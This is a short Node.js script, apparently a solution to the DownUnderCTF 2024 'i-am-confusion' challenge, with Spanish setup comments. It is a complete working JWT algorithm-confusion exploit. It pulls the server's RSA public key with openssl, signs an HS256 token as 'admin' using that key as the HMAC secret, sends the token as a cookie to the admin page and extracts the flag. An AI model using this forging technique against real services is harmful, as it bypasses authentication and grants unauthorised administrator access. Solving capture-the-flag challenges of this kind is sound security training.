//1. openssl s_client -connect i-am-confusion.2024.ductf.dev:30001 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > recurso/i-am-confusion.2024.ductf.dev.pem
//2. npm install jsonwebtoken|crypto si fuera necesario

const fs = require('fs');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');

const pem = fs.readFileSync('recurso/i-am-confusion.2024.ductf.dev.pem');
const publicKey = crypto.createPublicKey({
    key: pem,
    format: 'pem',
}).export({
    format: 'pem',
    type: 'pkcs1',
});

const token = jwt.sign({ user: 'admin' }, publicKey, { algorithm: 'HS256' });
console.log(token);

const url = 'https://i-am-confusion.2024.ductf.dev:30001/admin.html';
const headers = new Headers({
    'Cookie': 'auth=' + token
});

fetch(url, { headers: headers })
    .then(response => response.text())
    .then(text => {
        // Use a regular expression to extract the message inside the alert that contains "DUCTF"
        const match = text.match(/alert\('DUCTF{(.+?)}'\);/);
        if (match && match[1]) {
            const message = `DUCTF{${match[1]}}`;
            console.log(message); // Print the message inside the alert
        } else {
            console.log('Alert message not found or does not contain DUCTF');
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });